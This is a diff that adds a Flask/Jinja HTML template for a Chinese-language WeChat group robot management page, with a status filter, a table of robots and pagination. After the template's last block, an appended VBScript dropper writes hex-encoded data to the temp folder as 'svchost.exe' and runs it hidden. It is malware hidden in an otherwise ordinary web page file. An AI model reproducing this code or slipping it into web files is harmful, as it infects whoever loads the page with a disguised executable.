@@ -1,0 +1,112 @@
+{% extends "login/main.html" %}
+{% block page_header %}微信群管理页面{% endblock %}
+{% block sub_header %}
+
+
+<form id="my_from" class="form-inline" role="form">
+  <div class="form-group input-group-sm">
+    <select name='status' id="status"
+            class="form-control select-change">
+      <option value="" {% if status == "" %} selected="selected" {% endif %}>机器人状态</option>
+      <option value="close" {% if type == "Text" %} selected="selected" {% endif %}>close</option>
+      <option value="open" {% if type == "Picture" %} selected="selected" {% endif %}>open</option>
+    </select>
+  </div>
+  <button type="submit" class="btn btn-sm btn-primary" onclick="submit()">查询</button>
+</form>
+
+{% endblock%}
+{% block body %}
+<div class="container-fluid">
+  <table class="table table-striped">
+    <thead>
+      <tr>
+        <th class="text-nowrap">序号</th>
+        <th class="text-nowrap">id</th>
+        <th class="text-nowrap">机器人昵称</th>
+        <th class="text-nowrap">机器人状态</th>
+        <th class="text-nowrap">开始时间</th>
+        <th class="text-nowrap">结束时间</th>
+
+      </tr>
+    </thead>
+    <tbody>
+    {% for r in robots %}
+      <tr data-name="{{ r.id }}">
+        <td class="text-nowrap">{{ loop.index }}</td>
+        <td>{{ r.robot_id }}</td>
+        <td>{{ r.name }}</td>
+        <td>{{ r.status }}</td>
+        <td>{{ r.start_time }}</td>
+        <td>{{ r.end_time }}</td>
+      </tr>
+    {% endfor %}
+    </tbody>
+  </table>
+
+  <div class="pagination-wrap">
+    <ul class="pagination">
+        {% set offset = int(offset) %}
+        {% set limit = int(limit) %}
+        {% set count = int(count) %}
+        {% set current_page = int(offset/limit) + (1 if offset%limit else 0) %}
+        {% set total_page = int(count/limit) + (1 if count%limit else 0) %}
+      <li class="{{ "disabled" if current_page - 1 <= 0 else "" }}">
+        <a
+                href="{% if current_page>1 %}{{ url_for('data_robots', group=group,nick_name=nick_name,
+              actual_name=actual_name, remark_name=remark_name, province=province,
+              city=city, sex=sex, offset=(current_page-1)*limit, limit=limit)}}{% endif %}">&laquo;</a>
+      </li>
+
+    {% set prev = 0 %}
+    {% for i in range(0, total_page): %}
+    {% if abs(i-0) < 2 or abs(i-total_page) < 3 or -2 < i-current_page < 5: %}
+    {% set prev = i %}
+        <li class="{% if i == current_page %}active{% endif %}">
+{#          <a#}
+{#                  href="{{ url_for('data_query', entry=entry, mobile=mobile, cname=cname, status=status, start_time=start_time, end_time=end_time, offset=i*limit, limit=limit)}}">{{ i + 1 }}</a>#}
+            <a
+                  href="{{ url_for('data_robots', group=group,nick_name=nick_name,
+              actual_name=actual_name, remark_name=remark_name, province=province,
+              city=city, sex=sex, offset=i*limit, limit=limit)}}">{{ i + 1 }}</a>
+        </li>
+    {% elif prev == i-1: %}
+      <li class="disabled"><a>…</a></li>
+    {% endif %}
+    {% endfor %}
+
+      <li class="{{ "disabled" if current_page + 1 >= total_page else "" }}">
+{#        <a#}
+{#                href="{% if current_page+1<total_page %}{{ url_for('users.preloan_index', entry=entry, mobile=mobile, cname=cname, status=status, start_time=start_time, end_time=end_time, offset=(current_page+1)*limit, limit=limit)}}{% endif %}">&raquo;</a>#}
+      <a href="{% if current_page+1 < total_page %}
+                {{ url_for('data_robots', group=group,nick_name=nick_name,
+              actual_name=actual_name, remark_name=remark_name, province=province,
+              city=city, sex=sex, offset=(current_page+1)*limit, limit=limit) }}
+                {% endif %}">&raquo;
+      </a>
+      </li>
+    </ul>
+  </div>
+</div>
+{% endblock %}
+{% block script%}
+  <script type="text/javascript">
+    {#exMenu('preloan_index')#}
+    {#function download(){$('#my_from').attr("action","/download/preloan.xlsx");};#}
+    function submit(){$('#my_from').attr("action","");};
+  </script>
+
+{%endblock%}<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
